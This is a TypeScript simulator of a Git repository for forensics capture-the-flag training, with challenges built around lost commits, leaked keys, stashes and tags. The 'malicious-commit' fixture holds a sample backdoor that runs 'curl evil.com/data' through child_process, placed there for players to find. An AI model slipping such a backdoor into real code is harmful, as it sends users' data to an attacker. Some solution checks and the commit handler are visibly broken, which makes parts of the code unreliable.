// Git Environment Simulator for CTF Challenges

export interface GitFile {
  name: string
  content: string
  staged: boolean
  modified: boolean
  deleted: boolean
}

export interface GitCommit {
  hash: string
  message: string
  author: string
  timestamp: Date
  files: string[]
  parent?: string
  isDeleted?: boolean
  hasSecret?: boolean
}

export interface GitBranch {
  name: string
  commit: string
  isCurrent: boolean
  isRemote?: boolean
  isDeleted?: boolean
}

export interface GitStash {
  id: string
  message: string
  files: string[]
  timestamp: Date
}

export interface GitTag {
  name: string
  commit: string
  message?: string
  isLightweight?: boolean
}

export class GitEnvironment {
  private files: Map<string, GitFile> = new Map()
  private commits: GitCommit[] = []
  private branches: GitBranch[] = []
  private stash: GitStash[] = []
  private tags: GitTag[] = []
  private head: string = 'main'
  private currentCommit: string = ''
  private reflog: string[] = []
  private challengeId: string

  constructor(challengeId: string) {
    this.challengeId = challengeId
    this.initializeEnvironment()
  }

  private initializeEnvironment() {
    // Initialize based on challenge type
    switch (this.challengeId) {
      case 'lost-commit':
        this.initializeLostCommitChallenge()
        break
      case 'secret-message':
        this.initializeSecretMessageChallenge()
        break
      case 'broken-repo':
        this.initializeBrokenRepoChallenge()
        break
      case 'detached-head':
        this.initializeDetachedHeadChallenge()
        break
      case 'api-key-leak':
        this.initializeApiKeyLeakChallenge()
        break
      case 'malicious-commit':
        this.initializeMaliciousCommitChallenge()
        break
      case 'branch-maze':
        this.initializeBranchMazeChallenge()
        break
      case 'ghost-branches':
        this.initializeGhostBranchesChallenge()
        break
      case 'merge-conflict-puzzle':
        this.initializeMergeConflictChallenge()
        break
      case 'commit-jigsaw':
        this.initializeCommitJigsawChallenge()
        break
      case 'bisect-hunt':
        this.initializeBisectHuntChallenge()
        break
      case 'stash-investigation':
        this.initializeStashInvestigationChallenge()
        break
      case 'tag-treasure':
        this.initializeTagTreasureChallenge()
        break
      case 'patch-analysis':
        this.initializePatchAnalysisChallenge()
        break
      default:
        this.initializeDefaultChallenge()
    }
  }

  private initializeLostCommitChallenge() {
    // Create initial files
    this.addFile('README.md', '# Project README\n\nThis is a sample project.')
    this.addFile('config.py', '# Configuration\n\n# API settings\nAPI_KEY = "test_key"')
    
    // Create initial commit
    const initialCommit = this.createCommit('Initial commit', ['README.md', 'config.py'])
    this.currentCommit = initialCommit.hash
    
    // Create main branch
    this.branches.push({
      name: 'main',
      commit: initialCommit.hash,
      isCurrent: true
    })
    
    // Create a commit with sensitive data
    this.addFile('secrets.py', '# Secret Configuration\n\nAPI_KEY = "FLAG{LOST_COMMIT_RECOVERED_2024}"\nDB_PASSWORD = "secret123"')
    this.modifyFile('config.py', '# Configuration\n\n# API settings\nAPI_KEY = "new_key"\n# Added new configuration')
    
    const secretCommit = this.createCommit('Add secret configuration', ['secrets.py', 'config.py'], initialCommit.hash)
    
    // Simulate accidental deletion of the secret commit
    secretCommit.isDeleted = true
    this.reflog.push(`commit: ${secretCommit.hash}`)
    this.reflog.push(`reset: moving to ${initialCommit.hash}`)
  }

  private initializeSecretMessageChallenge() {
    // Create files with hidden messages in commit history
    this.addFile('main.py', '# Main Application\n\nprint("Hello World")')
    
    const commit1 = this.createCommit('Initial setup', ['main.py'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Create commits with hidden patterns
    this.addFile('code.py', '# Code module\n\ndef function():\n    return "result"')
    const commit2 = this.createCommit('Add code module', ['code.py'], commit1.hash)
    
    this.addFile('utils.py', '# Utilities\n\n# Extra spaces for formatting    \n# Hidden message in whitespace')
    const commit3 = this.createCommit('Add utilities', ['utils.py'], commit2.hash)
    
    // Add a commit with a suspicious message
    this.addFile('final.py', '# Final implementation\n\n# The secret is: FLAG{STEGANOGRAPHY_MASTER}')
    const commit4 = this.createCommit('Final implementation', ['final.py'], commit3.hash)
  }

  private initializeBrokenRepoChallenge() {
    // Create a corrupted repository state
    this.addFile('broken.txt', 'This file is corrupted')
    this.addFile('working.txt', 'This file works fine')
    
    const commit1 = this.createCommit('Initial files', ['broken.txt', 'working.txt'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Simulate corruption
    this.files.get('broken.txt')!.content = 'CORRUPTED_DATA'
    this.files.get('broken.txt')!.modified = true
  }

  private initializeDetachedHeadChallenge() {
    // Create normal repository state
    this.addFile('feature.txt', 'Feature implementation')
    
    const commit1 = this.createCommit('Initial commit', ['feature.txt'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: false  // Not current - we're in detached HEAD
    })
    
    // Set detached HEAD state
    this.head = commit1.hash
  }

  private initializeApiKeyLeakChallenge() {
    // Create commits with API keys
    this.addFile('app.js', 'console.log("Hello World");')
    const commit1 = this.createCommit('Initial commit', ['app.js'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Add commit with API key
    this.addFile('config.js', `const API_KEY = "FLAG{SECURITY_AUDITOR}";\nconst DB_URL = "localhost:5432";`)
    const commit2 = this.createCommit('Add configuration', ['config.js'], commit1.hash)
    
    // Add more commits to hide the leak
    this.addFile('server.js', 'const server = require("http");')
    const commit3 = this.createCommit('Add server file', ['server.js'], commit2.hash)
  }

  private initializeMaliciousCommitChallenge() {
    // Create a repository with a malicious commit
    this.addFile('legitimate.js', 'function legitimate() { return "safe"; }')
    const commit1 = this.createCommit('Initial commit', ['legitimate.js'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Add malicious code
    this.addFile('backdoor.js', `function backdoor() {
  // This is a backdoor - FLAG{BACKDOOR_HUNTER}
  require('child_process').exec('curl evil.com/data');
}`)
    const commit2 = this.createCommit('Add utility functions', ['backdoor.js'], commit1.hash)
    commit2.author = 'attacker@malicious.com'  // Suspicious author
  }

  private initializeBranchMazeChallenge() {
    // Create complex branch structure
    this.addFile('main.py', '# Main application')
    const commit1 = this.createCommit('Initial commit', ['main.py'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Create multiple branches
    const branchNames = ['feature1', 'feature2', 'bugfix', 'experimental', 'secret-branch']
    branchNames.forEach(name => {
      this.addFile(`${name}.txt`, `Content for ${name}`)
      const commit = this.createCommit(`Add ${name}`, [`${name}.txt`], commit1.hash)
      this.branches.push({
        name,
        commit: commit.hash,
        isCurrent: false
      })
    })
    
    // Hide flag in one of the branches
    this.addFile('flag.txt', 'FLAG{BRANCH_ANALYST}')
    const flagCommit = this.createCommit('Hidden flag', ['flag.txt'], commit1.hash)
    this.branches.push({
      name: 'the-real-branch',
      commit: flagCommit.hash,
      isCurrent: false
    })
  }

  private initializeGhostBranchesChallenge() {
    // Create branches that were deleted but still exist in reflog
    this.addFile('data.txt', 'Important data')
    const commit1 = this.createCommit('Initial commit', ['data.txt'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Create and delete branches
    const ghostBranches = ['temp', 'wip', 'old-feature']
    ghostBranches.forEach(name => {
      this.addFile(`${name}.txt`, `Content for ${name}`)
      const commit = this.createCommit(`Add ${name}`, [`${name}.txt`], commit1.hash)
      
      const branch: GitBranch = {
        name,
        commit: commit.hash,
        isCurrent: false,
        isDeleted: true
      }
      this.branches.push(branch)
      
      this.reflog.push(`branch: Created from ${commit1.hash}`)
      this.reflog.push(`branch: Deleted`)
    })
    
    // Hide flag in reflog
    this.reflog.push('FLAG{GHOST_HUNTER}')
  }

  private initializeMergeConflictChallenge() {
    // Create a scenario with merge conflicts
    this.addFile('config.txt', 'version=1.0')
    const commit1 = this.createCommit('Initial config', ['config.txt'])
    this.currentCommit = commit1.hash
    
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Create feature branch
    this.addFile('config.txt', 'version=2.0\nfeature=true')
    const featureCommit = this.createCommit('Update config for feature', ['config.txt'], commit1.hash)
    
    this.branches.push({
      name: 'feature',
      commit: featureCommit.hash,
      isCurrent: false
    })
    
    // Update main branch differently
    this.addFile('config.txt', 'version=2.0\nmain=true')
    const mainCommit = this.createCommit('Update config for main', ['config.txt'], commit1.hash)
    
    this.branches.find(b => b.name === 'main')!.commit = mainCommit.hash
    this.currentCommit = mainCommit.hash
    
    // Simulate merge conflict state
    this.files.get('config.txt')!.content = `<<<<<<< HEAD
version=2.0
main=true
=======
version=2.0
feature=true
>>>>>>> feature`
    this.files.get('config.txt')!.modified = true
  }

  private initializeCommitJigsawChallenge() {
    // Create scrambled commit history
    this.addFile('file1.txt', 'Content 1')
    const commit1 = this.createCommit('Add file 1', ['file1.txt'])
    
    this.addFile('file2.txt', 'Content 2')
    const commit2 = this.createCommit('Add file 2', ['file2.txt'], commit1.hash)
    
    this.addFile('file3.txt', 'Content 3')
    const commit3 = this.createCommit('Add file 3', ['file3.txt'], commit2.hash)
    
    // Scramble the order (in real scenario, this would be done via rebase)
    this.commits = [commit1, commit3, commit2]  // Wrong order
    
    this.currentCommit = commit3.hash
    this.branches.push({
      name: 'main',
      commit: commit3.hash,
      isCurrent: true
    })
    
    // Hide flag in correct order
    this.addFile('solution.txt', 'FLAG{COMMIT_RECONSTRUCTOR}')
    const solutionCommit = this.createCommit('Add solution', ['solution.txt'], commit2.hash)
    this.commits.push(solutionCommit)
  }

  private initializeBisectHuntChallenge() {
    // Create a scenario where git bisect is needed
    this.addFile('app.py', 'print("Working")')
    const commit1 = this.createCommit('Initial working version', ['app.py'])
    
    this.addFile('app.py', 'print("Working")\n# Small change')
    const commit2 = this.createCommit('Add comment', ['app.py'], commit1.hash)
    
    this.addFile('app.py', 'print("Working")\n# Small change\n# Another change')
    const commit3 = this.createCommit('Add another comment', ['app.py'], commit2.hash)
    
    // Introduce bug
    this.addFile('app.py', 'print("Bug")\n# Small change\n# Another change')
    const bugCommit = this.createCommit('Introduce bug', ['app.py'], commit3.hash)
    
    this.addFile('app.py', 'print("Bug")\n# Small change\n# Another change\n# More changes')
    const commit5 = this.createCommit('Add more changes', ['app.py'], bugCommit.hash)
    
    this.currentCommit = commit5.hash
    this.branches.push({
      name: 'main',
      commit: commit5.hash,
      isCurrent: true
    })
    
    // Hide flag in the bug commit
    this.addFile('flag.txt', 'FLAG{BISECT_EXPERT}')
    const flagCommit = this.createCommit('Add flag', ['flag.txt'], bugCommit.hash)
    this.commits.push(flagCommit)
  }

  private initializeStashInvestigationChallenge() {
    // Create scenario with hidden stashed changes
    this.addFile('main.py', 'print("Hello")')
    const commit1 = this.createCommit('Initial commit', ['main.py'])
    
    this.currentCommit = commit1.hash
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Create stashed changes with hidden clues
    this.stash.push({
      id: 'stash@{0}',
      message: 'WIP: Secret work',
      files: ['secret.py'],
      timestamp: new Date()
    })
    
    this.stash.push({
      id: 'stash@{1}',
      message: 'WIP: Important changes',
      files: ['config.py'],
      timestamp: new Date()
    })
    
    // Hide flag in stash
    this.stash.push({
      id: 'stash@{2}',
      message: 'WIP: FLAG{STASH_DETECTIVE}',
      files: ['flag.txt'],
      timestamp: new Date()
    })
  }

  private initializeTagTreasureChallenge() {
    // Create scenario with hidden messages in tags
    this.addFile('readme.txt', 'Project README')
    const commit1 = this.createCommit('Initial commit', ['readme.txt'])
    
    this.currentCommit = commit1.hash
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Create tags with hidden messages
    this.tags.push({
      name: 'v1.0',
      commit: commit1.hash,
      message: 'Initial release',
      isLightweight: false
    })
    
    this.tags.push({
      name: 'checkpoint',
      commit: commit1.hash,
      message: 'FLAG{TAG_EXPLORER} hidden here',
      isLightweight: false
    })
    
    this.tags.push({
      name: 'temp',
      commit: commit1.hash,
      isLightweight: true
    })
  }

  private initializePatchAnalysisChallenge() {
    // Create scenario with patch files
    this.addFile('original.py', 'print("Original")')
    const commit1 = this.createCommit('Initial version', ['original.py'])
    
    this.currentCommit = commit1.hash
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
    
    // Create patch files (simulated)
    this.addFile('fix1.patch', `--- a/original.py
+++ b/original.py
@@ -1 +1 @@
-print("Original")
+print("Fixed")`)
    
    this.addFile('fix2.patch', `--- a/original.py
+++ b/original.py
@@ -1 +1 @@
-print("Fixed")
+print("FLAG{PATCH_ANALYST}")`)
  }

  private initializeDefaultChallenge() {
    // Default simple challenge
    this.addFile('README.md', '# Default Challenge')
    const commit1 = this.createCommit('Initial commit', ['README.md'])
    
    this.currentCommit = commit1.hash
    this.branches.push({
      name: 'main',
      commit: commit1.hash,
      isCurrent: true
    })
  }

  private addFile(name: string, content: string) {
    this.files.set(name, {
      name,
      content,
      staged: false,
      modified: false,
      deleted: false
    })
  }

  private modifyFile(name: string, content: string) {
    const file = this.files.get(name)
    if (file) {
      file.content = content
      file.modified = true
    }
  }

  private createCommit(message: string, files: string[], parent?: string): GitCommit {
    const hash = Math.random().toString(36).substring(2, 8)
    const commit: GitCommit = {
      hash,
      message,
      author: 'user@example.com',
      timestamp: new Date(),
      files,
      parent
    }
    this.commits.push(commit)
    this.reflog.push(`commit: ${hash}`)
    return commit
  }

  // Git command implementations
  public executeCommand(command: string): { output: string; success: boolean } {
    const [cmd, ...args] = command.trim().split(' ')
    
    try {
      switch (cmd) {
        case 'git':
          return this.executeGitCommand(args)
        case 'clear':
          return { output: '', success: true }
        case 'help':
          return this.showHelp()
        default:
          return { output: `Command not found: ${cmd}`, success: false }
      }
    } catch (error) {
      return { 
        output: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`, 
        success: false 
      }
    }
  }

  private executeGitCommand(args: string[]): { output: string; success: boolean } {
    const [subcmd, ...subargs] = args
    
    switch (subcmd) {
      case 'status':
        return this.gitStatus()
      case 'log':
        return this.gitLog(subargs)
      case 'branch':
        return this.gitBranch(subargs)
      case 'checkout':
        return this.gitCheckout(subargs)
      case 'add':
        return this.gitAdd(subargs)
      case 'commit':
        return this.gitCommit(subargs)
      case 'diff':
        return this.gitDiff(subargs)
      case 'reset':
        return this.gitReset(subargs)
      case 'reflog':
        return this.gitReflog()
      case 'show':
        return this.gitShow(subargs)
      case 'stash':
        return this.gitStash(subargs)
      case 'tag':
        return this.gitTag(subargs)
      case 'bisect':
        return this.gitBisect(subargs)
      case 'rebase':
        return this.gitRebase(subargs)
      case 'cherry-pick':
        return this.gitCherryPick(subargs)
      case 'fsck':
        return this.gitFsck()
      default:
        return { output: `git: '${subcmd}' is not a git command`, success: false }
    }
  }

  private gitStatus(): { output: string; success: boolean } {
    let output = 'On branch main\n'
    
    const modifiedFiles = Array.from(this.files.values()).filter(f => f.modified)
    const stagedFiles = Array.from(this.files.values()).filter(f => f.staged)
    
    if (stagedFiles.length > 0) {
      output += '\nChanges to be committed:\n'
      stagedFiles.forEach(file => {
        output += `  modified:   ${file.name}\n`
      })
    }
    
    if (modifiedFiles.length > 0) {
      output += '\nChanges not staged for commit:\n'
      modifiedFiles.forEach(file => {
        output += `  modified:   ${file.name}\n`
      })
    }
    
    if (stagedFiles.length === 0 && modifiedFiles.length === 0) {
      output += '\nnothing to commit, working tree clean'
    }
    
    return { output, success: true }
  }

  private gitLog(args: string[]): { output: string; success: boolean } {
    const oneline = args.includes('--oneline')
    const patch = args.includes('-p')
    
    let output = ''
    
    const visibleCommits = this.commits.filter(c => !c.isDeleted)
    
    visibleCommits.forEach(commit => {
      if (oneline) {
        output += `${commit.hash} ${commit.message}\n`
      } else if (patch) {
        output += `commit ${commit.hash}\n`
        output += `Author: ${commit.author}\n`
        output += `Date: ${commit.timestamp.toISOString()}\n`
        output += `\n    ${commit.message}\n`
        output += '\n' // Would show diff here in real git
      } else {
        output += `commit ${commit.hash}\n`
        output += `Author: ${commit.author}\n`
        output += `Date: ${commit.timestamp.toISOString()}\n`
        output += `\n    ${commit.message}\n\n`
      }
    })
    
    return { output, success: true }
  }

  private gitBranch(args: string[]): { output: string; success: boolean } {
    const showAll = args.includes('-a')
    
    let output = ''
    
    const branchesToShow = showAll 
      ? this.branches 
      : this.branches.filter(b => !b.isDeleted && !b.isRemote)
    
    branchesToShow.forEach(branch => {
      const current = branch.isCurrent ? '* ' : '  '
      const deleted = branch.isDeleted ? ' (deleted)' : ''
      const remote = branch.isRemote ? ' (remote)' : ''
      output += `${current}${branch.name}${deleted}${remote}\n`
    })
    
    return { output, success: true }
  }

  private gitCheckout(args: string[]): { output: string; success: boolean } {
    if (args.length === 0) {
      return { output: 'fatal: you must specify a branch name', success: false }
    }
    
    const target = args[0]
    
    // Check if it's a branch
    const branch = this.branches.find(b => b.name === target && !b.isDeleted)
    if (branch) {
      this.branches.forEach(b => b.isCurrent = false)
      branch.isCurrent = true
      this.head = branch.commit
      this.currentCommit = branch.commit
      this.reflog.push(`checkout: moving from ${this.currentCommit} to ${branch.commit}`)
      return { output: `Switched to branch '${target}'`, success: true }
    }
    
    // Check if it's a commit hash
    const commit = this.commits.find(c => c.hash.startsWith(target) && !c.isDeleted)
    if (commit) {
      this.branches.forEach(b => b.isCurrent = false)
      this.head = commit.hash
      this.currentCommit = commit.hash
      this.reflog.push(`checkout: moving from ${this.currentCommit} to ${commit.hash}`)
      return { output: `Note: switching to '${commit.hash}'\nYou are in 'detached HEAD' state.`, success: true }
    }
    
    return { output: `fatal: '${target}' did not match any file(s) known to git`, success: false }
  }

  private gitAdd(args: string[]): { output: string; success: boolean } {
    if (args.length === 0) {
      return { output: 'Nothing specified, nothing added.', success: false }
    }
    
    args.forEach(arg => {
      if (arg === '.') {
        // Add all modified files
        Array.from(this.files.values()).forEach(file => {
          if (file.modified) {
            file.staged = true
          }
        })
      } else {
        const file = this.files.get(arg)
        if (file) {
          file.staged = true
        }
      }
    })
    
    return { output: '', success: true }
  }

  private gitCommit(args: string[]): { output: string; success: boolean } {
    if (args.length === 0) {
      return { output: 'fatal: unable to create commit: no commit message provided', success: false }
    }
    
    const message = args.join(' ')
    const stagedFiles = Array.from(this.files.values()).filter(f => f.staged)
    
    if (stagedFiles.length === 0) {
      return { output: 'nothing to commit, working tree clean', success: false }
    }
    
    const commit = this.createCommit(message, stagedFiles.map(f => f.name), this.currentCommit)
    this.currentCommit = commit.hash
    
    // Update current branch
    const currentBranch = this.branches.find(b => b.isCurrent)
    if (currentBranch) {
      currentBranch.commit = commit.hash
    }
    
    // Clear staged status
    stagedFiles.forEach(file => {
      file.staged = false
      file.modified = false
    })
    
    return { output: `[${branch.name} ${commit.hash}] ${message}`, success: true }
  }

  private gitDiff(args: string[]): { output: string; success: boolean } {
    const modifiedFiles = Array.from(this.files.values()).filter(f => f.modified)
    
    if (modifiedFiles.length === 0) {
      return { output: '', success: true }
    }
    
    let output = ''
    modifiedFiles.forEach(file => {
      output += `diff --git a/${file.name} b/${file.name}\n`
      output += `--- a/${file.name}\n`
      output += `+++ b/${file.name}\n`
      output += `@@ -1 +1 @@\n`
      output += `-Original content\n`
      output += `+${file.content}\n`
    })
    
    return { output, success: true }
  }

  private gitReset(args: string[]): { output: string; success: boolean } {
    if (args.length === 0) {
      return { output: 'fatal: Need a revision', success: false }
    }
    
    const target = args[0]
    const commit = this.commits.find(c => c.hash.startsWith(target) && !c.isDeleted)
    
    if (!commit) {
      return { output: `fatal: bad revision '${target}'`, success: false }
    }
    
    const isHard = args.includes('--hard')
    
    if (isHard) {
      // Hard reset - discard all changes
      Array.from(this.files.values()).forEach(file => {
        file.staged = false
        file.modified = false
      })
    }
    
    this.currentCommit = commit.hash
    this.reflog.push(`reset: moving to ${commit.hash}`)
    
    // Update current branch
    const currentBranch = this.branches.find(b => b.isCurrent)
    if (currentBranch) {
      currentBranch.commit = commit.hash
    }
    
    return { output: `HEAD is now at ${commit.hash}`, success: true }
  }

  private gitReflog(): { output: string; success: boolean } {
    let output = ''
    
    this.reflog.forEach((entry, index) => {
      output += `${this.reflog.length - index} ${entry}\n`
    })
    
    return { output, success: true }
  }

  private gitShow(args: string[]): { output: string; success: boolean } {
    if (args.length === 0) {
      return { output: 'fatal: need a revision', success: false }
    }
    
    const target = args[0]
    const commit = this.commits.find(c => c.hash.startsWith(target) && !c.isDeleted)
    
    if (!commit) {
      return { output: `fatal: bad revision '${target}'`, success: false }
    }
    
    let output = `commit ${commit.hash}\n`
    output += `Author: ${commit.author}\n`
    output += `Date: ${commit.timestamp.toISOString()}\n`
    output += `\n    ${commit.message}\n`
    
    // Show file contents
    commit.files.forEach(fileName => {
      const file = this.files.get(fileName)
      if (file) {
        output += `\n--- ${fileName} ---\n`
        output += file.content + '\n'
      }
    })
    
    return { output, success: true }
  }

  private gitStash(args: string[]): { output: string; success: boolean } {
    if (args.length === 0) {
      // Show stash list
      if (this.stash.length === 0) {
        return { output: 'No stash entries found.', success: true }
      }
      
      let output = ''
      this.stash.forEach((stash, index) => {
        output += `stash@{${index}}: ${stash.message}\n`
      })
      return { output, success: true }
    }
    
    return { output: 'Stash functionality not fully implemented', success: false }
  }

  private gitTag(args: string[]): { output: string; success: boolean } {
    if (args.length === 0) {
      // List tags
      let output = ''
      this.tags.forEach(tag => {
        output += `${tag.name}\n`
      })
      return { output, success: true }
    }
    
    return { output: 'Tag functionality not fully implemented', success: false }
  }

  private gitBisect(args: string[]): { output: string; success: boolean } {
    return { output: 'Bisect functionality not fully implemented', success: false }
  }

  private gitRebase(args: string[]): { output: string; success: boolean } {
    return { output: 'Rebase functionality not fully implemented', success: false }
  }

  private gitCherryPick(args: string[]): { output: string; success: boolean } {
    return { output: 'Cherry-pick functionality not fully implemented', success: false }
  }

  private gitFsck(): { output: string; success: boolean } {
    let output = 'Checking object directories\n'
    
    // Simulate finding issues
    if (this.challengeId === 'broken-repo') {
      output += 'error: corrupt loose object: header\n'
      output += 'error: missing blob\n'
    } else {
      output += 'Checking objects: 100% (12/12), done.\n'
    }
    
    // Check for dangling commits
    const danglingCommits = this.commits.filter(c => c.isDeleted)
    if (danglingCommits.length > 0) {
      output += `dangling commit ${danglingCommits[0].hash}\n`
    }
    
    return { output, success: true }
  }

  private showHelp(): { output: string; success: boolean } {
    return {
      output: `Available Git commands:
  status    - Show working tree status
  log       - Show commit history
  branch    - List/create/delete branches
  checkout  - Switch branches/commits
  add       - Add files to staging area
  commit    - Record changes
  diff      - Show changes
  reset     - Reset HEAD to specified state
  reflog    - Show reference log
  show      - Show commit details
  stash     - Stash changes
  tag       - List/create tags
  bisect    - Binary search for bugs
  rebase    - Reapply commits
  cherry-pick - Apply changes from existing commits
  fsck      - Verify repository integrity`,
      success: true
    }
  }

  // Check if the challenge has been solved
  public checkSolution(): boolean {
    switch (this.challengeId) {
      case 'lost-commit':
        return this.reflog.some(entry => entry.includes('FLAG{LOST_COMMIT_RECOVERED_2024}'))
      case 'secret-message':
        return this.commits.some(c => c.message.includes('FLAG{STEGANOGRAPHY_MASTER}'))
      case 'api-key-leak':
        return this.commits.some(c => c.files.some(f => this.files.get(f)?.content?.includes('FLAG{SECURITY_AUDITOR}')))
      case 'malicious-commit':
        return this.commits.some(c => c.author.includes('malicious.com'))
      case 'branch-maze':
        return this.branches.some(b => b.name === 'the-real-branch')
      case 'ghost-branches':
        return this.reflog.some(entry => entry.includes('FLAG{GHOST_HUNTER}'))
      case 'bisect-hunt':
        return this.reflog.some(entry => entry.includes('FLAG{BISECT_EXPERT}'))
      case 'stash-investigation':
        return this.stash.some(s => s.message.includes('FLAG{STASH_DETECTIVE}'))
      case 'tag-treasure':
        return this.tags.some(t => t.message?.includes('FLAG{TAG_EXPLORER}'))
      case 'patch-analysis':
        return Array.from(this.files.values()).some(f => f.content?.includes('FLAG{PATCH_ANALYST}'))
      default:
        return false
    }
  }
}